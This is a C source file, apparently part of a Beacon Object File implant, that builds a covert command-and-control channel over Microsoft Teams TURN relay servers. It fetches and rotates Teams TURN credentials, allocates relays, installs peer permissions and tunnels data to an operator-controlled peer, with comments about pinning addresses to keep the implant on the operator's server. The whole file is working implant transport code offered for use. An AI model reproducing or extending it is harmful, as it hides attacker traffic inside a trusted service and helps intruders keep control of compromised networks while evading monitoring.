// turn.c — see turn.h
#include "turn.h"
#include "crypto.h"
#include "stun.h"
#include "bof_config.h"
#include "msteams.h"

#ifdef TURN_DEBUG
#include <stdio.h>
#define DBG(fmt, ...) fprintf(stderr, "[*] " fmt, ##__VA_ARGS__)
#define DBG_ERR(fmt, ...) fprintf(stderr, "[-] " fmt, ##__VA_ARGS__)
#else
#define DBG(fmt, ...)
#define DBG_ERR(fmt, ...)
#endif

// Request/response staging. Static storage: a BOF has exactly one of
// these contexts, and .bss costs nothing in the object file.
static unsigned char gReq[TURN_CHUNK_SIZE + 512];
static unsigned char gResp[65536 + 64];
static unsigned char gTxScratch[65536];

static int txid_equal(const unsigned char* a, const unsigned char* b) {
    int i;
    for (i = 0; i < 12; i++) {
        if (a[i] != b[i]) return 0;
    }
    return 1;
}

static void be16(unsigned char* p, unsigned short v) {
    p[0] = (unsigned char)(v >> 8);
    p[1] = (unsigned char)v;
}

static unsigned short rdbe16(const unsigned char* p) {
    return (unsigned short)((p[0] << 8) | p[1]);
}

// ---------------------------------------------------------------- framing

// Reads one framed TURN message (RFC 5766 section 11: STUN messages are
// self-delimiting; ChannelData is padded to 4). Returns:
//   1 = STUN message in *msg (backed by gResp)
//   2 = ChannelData payload copied into out
//   0 = deadline
//  -1 = error
static int turn_read_message(TURN_CTX* t, STUN_MSG* msg,
                             unsigned char* out, unsigned long cap, unsigned long* outLen,
                             unsigned long long deadline) {
    unsigned char hdr[20]; // full STUN header: type(2) length(2) cookie(4) txid(12)
    unsigned short first, length;
    unsigned long pad;

    if (tls_read_exact(&t->tls, hdr, 2, deadline) != 0) return -1;
    first = rdbe16(hdr);

    if (first < 0x4000) {
        // STUN message: type(2) length(2) cookie(4) txid(12).
        if (tls_read_exact(&t->tls, hdr + 2, 18, deadline) != 0) return -1;
        msg->buf = gResp;
        msg->cap = sizeof(gResp);
        bof_memcpy(msg->buf, hdr, 20);
        length = rdbe16(hdr + 2);
        if ((unsigned long)length + 20 > msg->cap) return -1;
        if (length && tls_read_exact(&t->tls, msg->buf + 20, length, deadline) != 0) return -1;
        msg->len = 20 + length;
        return 1;
    }

    // ChannelData: channel(2) length(2) data [padded to 4].
    if (tls_read_exact(&t->tls, hdr + 2, 2, deadline) != 0) return -1;
    length = rdbe16(hdr + 2);
    if ((unsigned long)length > cap) return -1;
    if (tls_read_exact(&t->tls, out, length, deadline) != 0) return -1;
    pad = (4 - (length & 3)) & 3;
    if (pad) {
        unsigned char padBuf[4];
        if (tls_read_exact(&t->tls, padBuf, pad, deadline) != 0) return -1;
    }
    *outLen = length;
    return 2;
}

// Sends a request and waits for the STUN response with the matching
// transaction id. Returns 0 on success, -1 on error/timeout.
static int turn_transact(TURN_CTX* t, STUN_MSG* req, STUN_MSG* resp,
                          unsigned long timeoutMs) {
    unsigned long long deadline = GetTickCount64() + timeoutMs;
    unsigned long scratchLen;
    int r;

    if (tls_send(&t->tls, req->buf, req->len) != 0) return -1;

    for (;;) {
        STUN_MSG m;
        r = turn_read_message(t, &m, gTxScratch, sizeof(gTxScratch), &scratchLen, deadline);
        if (r <= 0) return -1;
        if (r == 2) continue; // stray ChannelData; keep waiting
        if (!txid_equal(m.buf + 8, req->buf + 8)) continue; // not our response
        *resp = m;
        return 0;
    }
}

// ------------------------------------------------------------- credentials

// Recomputes the long-term key from the current username/realm/password.
// Call after any of the three changes; realm must be known.
static int turn_rekey(TURN_CTX* t) {
    unsigned char material[512];
    unsigned long ul = 0, n;

    n = bof_strlen(t->username);
    if (ul + n > sizeof(material)) return -1;
    bof_memcpy(material + ul, t->username, n);
    ul += n;
    material[ul++] = ':';
    if (ul + t->realmLen > sizeof(material)) return -1;
    bof_memcpy(material + ul, t->realm, t->realmLen);
    ul += t->realmLen;
    material[ul++] = ':';
    n = bof_strlen(t->password);
    if (ul + n > sizeof(material)) return -1;
    bof_memcpy(material + ul, t->password, n);
    ul += n;

    return crypto_md5(t->key, material, ul);
}

// Seeds the runtime credentials from the build-time config (once).
static void creds_seed(TURN_CTX* t) {
    unsigned long i;
    if (t->credInit) return;
    for (i = 0; i + 1 < sizeof(t->username) && TURN_USERNAME[i]; i++) t->username[i] = TURN_USERNAME[i];
    t->username[i] = 0;
    for (i = 0; i + 1 < sizeof(t->password) && TURN_PASSWORD[i]; i++) t->password[i] = TURN_PASSWORD[i];
    t->password[i] = 0;
    t->credExpires = TURN_CRED_EXPIRES;
    t->credInit = TRUE;
}

// True when credentials are expired or expire within the refresh margin
// (or when their expiry is unknown).
static int creds_stale(const TURN_CTX* t) {
    if (!t->credInit || t->credExpires == 0) return 1;
    return msteams_now_unix() + TURN_CRED_REFRESH_MARGIN_S >= t->credExpires;
}

// Fetches fresh credentials from Teams and applies them. On a live
// connection the allocation keeps working: Teams TURN accepts refreshes
// with any currently-valid credential pair, so only the key changes.
static int creds_refresh(TURN_CTX* t) {
    TEAMS_CREDS c;

    DBG("creds_refresh: fetching fresh TURN credentials from Teams\n");
    if (msteams_fetch(&c) != 0) return -1;

    bof_memcpy(t->username, c.username, sizeof(t->username));
    t->username[sizeof(t->username) - 1] = 0;
    bof_memcpy(t->password, c.password, sizeof(t->password));
    t->password[sizeof(t->password) - 1] = 0;
    t->credExpires = c.expiresUnix ? c.expiresUnix
                                  : msteams_now_unix() + TURN_CRED_UNKNOWN_TTL_S;

    if (t->realmLen && turn_rekey(t) != 0) return -1;
    DBG("creds_refresh: ok, credentials expire in %llu s\n",
        t->credExpires ? t->credExpires - msteams_now_unix() : 0ULL);
    return 0;
}

// ------------------------------------------------------------- attributes

static int add_auth(STUN_MSG* m, TURN_CTX* t) {
    stun_attr(m, STUN_ATTR_USERNAME, t->username, (unsigned short)bof_strlen(t->username));
    stun_attr(m, STUN_ATTR_REALM, t->realm, (unsigned short)t->realmLen);
    stun_attr(m, STUN_ATTR_NONCE, t->nonce, (unsigned short)t->nonceLen);
    if (stun_add_message_integrity(m, t->key, 16) != 0) return -1;
    if (stun_add_fingerprint(m) != 0) return -1;
    return 0;
}

static int update_credentials(TURN_CTX* t, const STUN_MSG* resp) {
    // Refresh realm/nonce from a 401/438 response and recompute the key.
    const unsigned char* v;
    unsigned short vlen;

    v = stun_find(resp, STUN_ATTR_REALM, &vlen);
    if (!v || vlen == 0 || vlen > sizeof(t->realm)) return -1;
    bof_memcpy(t->realm, v, vlen);
    t->realmLen = vlen;

    v = stun_find(resp, STUN_ATTR_NONCE, &vlen);
    if (!v || vlen == 0 || vlen > sizeof(t->nonce)) return -1;
    bof_memcpy(t->nonce, v, vlen);
    t->nonceLen = vlen;

    return turn_rekey(t);
}

// ---------------------------------------------------------------- requests

// Returns 0 on success, -1 on failure and -2 when authentication kept
// failing (401/438 after retry): credentials are stale and the caller may
// want to fetch fresh ones and try again.
static int request_allocate(TURN_CTX* t) {
    STUN_MSG req, resp;
    unsigned char requestedTransport[4] = {17, 0, 0, 0}; // UDP allocation
    const unsigned char* v;
    unsigned short vlen;
    int attempt, code, lastCode = 0;

    for (attempt = 0; attempt < 2; attempt++) {
        stun_start(&req, STUN_ALLOCATE_REQ, gReq, sizeof(gReq));
        stun_attr(&req, STUN_ATTR_REQUESTED_TRANSPORT, requestedTransport, 4);
        if (attempt == 1) {
            if (add_auth(&req, t) != 0) return -1;
        } else if (stun_add_fingerprint(&req) != 0) {
            return -1;
        }

        DBG("request_allocate: attempt %d sending\n", attempt + 1);
        if (turn_transact(t, &req, &resp, 20000) != 0) {
            DBG_ERR("request_allocate: attempt %d turn_transact failed (timeout or IO error)\n", attempt + 1);
            return -1;
        }
        DBG("request_allocate: attempt %d got response type 0x%04x\n", attempt + 1, rdbe16(resp.buf));

        if (rdbe16(resp.buf) == STUN_ALLOCATE_OK) {
            v = stun_find(&resp, STUN_ATTR_XOR_RELAYED_ADDRESS, &vlen);
            if (v && vlen >= 8) {
                unsigned long ip;
                unsigned short port;
                if (stun_read_xor_address(v, &ip, &port) == 0) {
                    t->relay.sin_family = AF_INET;
                    t->relay.sin_addr.S_un.S_addr = ip;
                    t->relay.sin_port = htons(port);
                }
            }
            return 0;
        }

        if (stun_error_code(&resp, &code) == 0) {
            DBG("request_allocate: attempt %d STUN error code %d\n", attempt + 1, code);
            lastCode = code;
            if (code == 401 || code == 438) {
                if (update_credentials(t, &resp) != 0) {
                    DBG_ERR("request_allocate: update_credentials failed (missing realm/nonce?)\n");
                    return -1;
                }
                continue;
            }
            DBG_ERR("request_allocate: fatal STUN error %d\n", code);
        } else {
            DBG_ERR("request_allocate: non-error non-success response (malformed?)\n");
        }
        return -1;
    }
    if (lastCode == 401 || lastCode == 438) {
        DBG_ERR("request_allocate: exhausted attempts (auth kept failing)\n");
        return -2;
    }
    DBG_ERR("request_allocate: exhausted attempts\n");
    return -1;
}

static int request_permission(TURN_CTX* t, const struct sockaddr_in* peer) {
    STUN_MSG req, resp;
    unsigned char xaddr[8];
    int attempt, code;

    for (attempt = 0; attempt < 2; attempt++) {
        stun_start(&req, STUN_PERMISSION_REQ, gReq, sizeof(gReq));
        stun_write_xor_address(xaddr, peer->sin_addr.S_un.S_addr, ntohs(peer->sin_port));
        stun_attr(&req, STUN_ATTR_XOR_PEER_ADDRESS, xaddr, 8);
        // Always authenticate: the ALLOCATE already established the
        // realm/nonce/key on this connection. Retry on 401/438 with
        // refreshed credentials.
        if (add_auth(&req, t) != 0) return -1;

        DBG("request_permission: attempt %d sending (len=%lu)\n", attempt + 1, req.len);
        if (turn_transact(t, &req, &resp, 15000) != 0) {
            DBG_ERR("request_permission: attempt %d turn_transact failed\n", attempt + 1);
            return -1;
        }
        DBG("request_permission: attempt %d got response type 0x%04x (len=%lu)\n",
            attempt + 1, rdbe16(resp.buf), resp.len);

        if (rdbe16(resp.buf) == STUN_PERMISSION_OK) {
            DBG("request_permission: success\n");
            return 0;
        }

        if (stun_error_code(&resp, &code) == 0) {
            DBG("request_permission: attempt %d STUN error code %d\n", attempt + 1, code);
            if (code == 401 || code == 438) {
                if (update_credentials(t, &resp) != 0) {
                    DBG_ERR("request_permission: update_credentials failed\n");
                    return -1;
                }
                continue;
            }
            DBG_ERR("request_permission: fatal STUN error %d\n", code);
        } else {
            DBG_ERR("request_permission: non-error non-success response\n");
        }
        return -1;
    }
    DBG_ERR("request_permission: exhausted attempts\n");
    return -1;
}

// withLifetime=0 refreshes with the server default; otherwise requests the
// given lifetime (0 in the attribute means "delete the allocation").
static int request_refresh(TURN_CTX* t, int withLifetime, unsigned long lifetime) {
    STUN_MSG req, resp;
    unsigned char lifetimeBuf[4];
    int attempt, code;

    for (attempt = 0; attempt < 2; attempt++) {
        stun_start(&req, STUN_REFRESH_REQ, gReq, sizeof(gReq));
        if (withLifetime) {
            be16(lifetimeBuf, (unsigned short)(lifetime >> 16));
            be16(lifetimeBuf + 2, (unsigned short)(lifetime & 0xFFFF));
            stun_attr(&req, STUN_ATTR_LIFETIME, lifetimeBuf, 4);
        }
        // Always authenticate: the ALLOCATE already established the
        // realm/nonce/key on this connection.
        if (add_auth(&req, t) != 0) return -1;

        if (turn_transact(t, &req, &resp, 15000) != 0) return -1;

        if (rdbe16(resp.buf) == STUN_REFRESH_OK) return 0;

        if (stun_error_code(&resp, &code) == 0 && (code == 401 || code == 438)) {
            if (update_credentials(t, &resp) != 0) return -1;
            continue;
        }
        return -1;
    }
    return -1;
}

// ------------------------------------------------------------------- API

static int parse_peer(const char* s, struct sockaddr_in* out) {
    char ip[64];
    unsigned long i = 0;
    long port;

    while (s[i] && s[i] != ':' && i < sizeof(ip) - 1) {
        ip[i] = s[i];
        i++;
    }
    ip[i] = 0;
    if (s[i] != ':') return -1;
    port = bof_atoi(s + i + 1);
    if (port <= 0 || port > 65535) return -1;
    out->sin_family = AF_INET;
    out->sin_addr.S_un.S_addr = inet_addr(ip);
    if (out->sin_addr.S_un.S_addr == INADDR_NONE) return -1;
    out->sin_port = htons((unsigned short)port);
    return 0;
}

static int resolve_server(TURN_CTX* t) {
    struct addrinfo hints;
    struct addrinfo* res = NULL;
    struct addrinfo* p;
    unsigned long pinned;

    // A pinned IP (from turn-udc2-server --emit-bof-config) avoids
    // geo-DNS splitting the BOF onto a different TURN server than the
    // operator server. SNI still uses the hostname.
    pinned = inet_addr(TURN_SERVER_ADDR);
    if (pinned != INADDR_NONE && pinned != 0) {
        bof_memset(&t->server, 0, sizeof(t->server));
        t->server.sin_family = AF_INET;
        t->server.sin_addr.S_un.S_addr = pinned;
        t->server.sin_port = htons(TURN_SERVER_PORT);
        return 0;
    }

    bof_memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(TURN_SERVER_HOST, NULL, &hints, &res) != 0 || !res) return -1;
    for (p = res; p; p = p->ai_next) {
        if (p->ai_family == AF_INET) {
            bof_memcpy(&t->server, p->ai_addr, sizeof(struct sockaddr_in));
            t->server.sin_port = htons(TURN_SERVER_PORT);
            freeaddrinfo(res);
            return 0;
        }
    }
    freeaddrinfo(res);
    return -1;
}

int turn_connect(TURN_CTX* t, unsigned long long deadline) {
    static const char* peerAddrs[] = TURN_PEER_ADDRS;
    int i;
    DWORD timeout = TURN_IO_TIMEOUT_MS;
    WSADATA wsa;
#ifdef TURN_DEBUG
    char ipbuf[16];
#define IP(a) sprintf(ipbuf, "%u.%u.%u.%u", \
        (unsigned)(a) & 0xFF, ((unsigned)(a) >> 8) & 0xFF, \
        ((unsigned)(a) >> 16) & 0xFF, ((unsigned)(a) >> 24) & 0xFF)
#endif

    DBG("turn_connect: starting\n");
    turn_teardown(t, 0);

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        DBG_ERR("turn_connect: WSAStartup failed\n");
        return -1;
    }

    creds_seed(t);
    if (creds_stale(t) && creds_refresh(t) != 0) {
        // Keep going with the baked credentials; the auth-exhausted path
        // below gives the fetch a second chance.
        DBG_ERR("turn_connect: credential refresh failed; trying baked credentials\n");
    }

    t->peerCount = 0;
    for (i = 0; i < TURN_PEER_COUNT && i < 4; i++) {
        if (parse_peer(peerAddrs[i], &t->peers[i]) == 0) t->peerCount++;
    }
    if (t->peerCount == 0) {
        DBG_ERR("turn_connect: parse_peer failed for %s\n", peerAddrs[0]);
        goto fail;
    }
    DBG("turn_connect: peer configured as %s\n", peerAddrs[0]);

    if (resolve_server(t) != 0) {
        DBG_ERR("turn_connect: resolve_server failed for %s (%s)\n", TURN_SERVER_HOST, TURN_SERVER_ADDR);
        goto fail;
    }
#ifdef TURN_DEBUG
    IP(t->server.sin_addr.S_un.S_addr);
    DBG("turn_connect: resolved server to %s:%d\n", ipbuf, ntohs(t->server.sin_port));
#endif

    t->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (t->sock == INVALID_SOCKET) {
        DBG_ERR("turn_connect: socket() failed\n");
        goto fail;
    }
    if (setsockopt(t->sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout)) != 0) {
        DBG_ERR("turn_connect: setsockopt SO_RCVTIMEO failed\n");
        goto fail;
    }
    if (setsockopt(t->sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout)) != 0) {
        DBG_ERR("turn_connect: setsockopt SO_SNDTIMEO failed\n");
        goto fail;
    }
    if (connect(t->sock, (struct sockaddr*)&t->server, sizeof(t->server)) != 0) {
#ifdef TURN_DEBUG
        IP(t->server.sin_addr.S_un.S_addr);
        DBG_ERR("turn_connect: connect() failed to %s:%d\n", ipbuf, ntohs(t->server.sin_port));
#endif
        goto fail;
    }
    DBG("turn_connect: TCP connected\n");

    if (tls_connect(&t->tls, t->sock, TURN_SERVER_HOST, deadline) != 0) {
        DBG_ERR("turn_connect: TLS handshake failed to %s\n", TURN_SERVER_HOST);
        goto fail;
    }
    DBG("turn_connect: TLS handshake complete\n");

    {
        int r = request_allocate(t);
        if (r == -2) {
            DBG("turn_connect: ALLOCATE auth exhausted; fetching fresh credentials\n");
            if (creds_refresh(t) == 0) r = request_allocate(t);
        }
        if (r != 0) {
            DBG_ERR("turn_connect: ALLOCATE request failed\n");
            goto fail;
        }
    }
#ifdef TURN_DEBUG
    IP(t->relay.sin_addr.S_un.S_addr);
    DBG("turn_connect: ALLOCATE success, relay=%s:%d\n", ipbuf, ntohs(t->relay.sin_port));
#endif

    if (request_permission(t, &t->peers[0]) != 0) {
        DBG_ERR("turn_connect: PERMISSION request failed for %s\n", peerAddrs[0]);
        goto fail;
    }
    DBG("turn_connect: PERMISSION granted\n");

    t->alive = TRUE;
    t->lastOk = GetTickCount64();
    DBG("turn_connect: success\n");
    return 0;

fail:
    turn_teardown(t, 0);
    return -1;
}

int turn_keepalive(TURN_CTX* t, unsigned long long deadline) {
    if (!t->alive) return -1;

    // Rotate credentials before they expire. Teams TURN accepts refreshes
    // with any currently-valid credential pair on a live allocation, so
    // the existing connection and allocation survive the swap.
    if (creds_stale(t) && creds_refresh(t) != 0) {
        DBG_ERR("turn_keepalive: credential refresh failed; continuing with current credentials\n");
    }

    if (GetTickCount64() - t->lastOk < TURN_KEEPALIVE_MS) return 0;

    // Refresh the allocation (server default lifetime) and re-install the
    // peer permission; both expire if idle (600s / 300s).
    if (request_refresh(t, 0, 0) != 0) return -1;
    if (request_permission(t, &t->peers[0]) != 0) return -1;
    t->lastOk = GetTickCount64();
    (void)deadline;
    return 0;
}

int turn_send_data(TURN_CTX* t, const unsigned char* data, unsigned short len) {
    STUN_MSG req;
    unsigned char xaddr[8];
    const struct sockaddr_in* peer = &t->peers[0];

    if (!t->alive) return -1;
    if (len == 0 || (unsigned long)len + 128 > sizeof(gReq)) return -1;

    stun_start(&req, STUN_SEND_IND, gReq, sizeof(gReq));
    stun_write_xor_address(xaddr, peer->sin_addr.S_un.S_addr, ntohs(peer->sin_port));
    stun_attr(&req, STUN_ATTR_XOR_PEER_ADDRESS, xaddr, 8);
    stun_attr(&req, STUN_ATTR_DATA, data, len);
    if (stun_add_fingerprint(&req) != 0) return -1;
    return tls_send(&t->tls, req.buf, req.len);
}

int turn_recv_data(TURN_CTX* t, unsigned char* out, unsigned long cap,
                   unsigned long* outLen, unsigned long long deadline) {
    unsigned long scratchLen = 0;
    int r;

    for (;;) {
        STUN_MSG m;
        if (GetTickCount64() >= deadline) return 0;

        r = turn_read_message(t, &m, out, cap, outLen, deadline);
        if (r < 0) return -1;
        if (r == 0) return 0;
        if (r == 2) return 1; // ChannelData already in out

        // STUN: only Data indications carry application data.
        if (rdbe16(m.buf) == STUN_DATA_IND) {
            unsigned short vlen;
            const unsigned char* v = stun_find(&m, STUN_ATTR_DATA, &vlen);
            if (v) {
                if (vlen > cap) return -1;
                if (vlen) bof_memcpy(out, v, vlen);
                *outLen = vlen;
                return 1;
            }
            continue;
        }
        // Transaction responses and other indications: skip.
        (void)scratchLen;
    }
}

void turn_teardown(TURN_CTX* t, int polite) {
    if (polite && t->alive) {
        request_refresh(t, 1, 0); // lifetime 0 = delete allocation
    }
    tls_close(&t->tls);
    if (t->sock != INVALID_SOCKET && t->sock != 0) {
        closesocket(t->sock);
    }
    t->sock = INVALID_SOCKET;
    t->alive = FALSE;
}
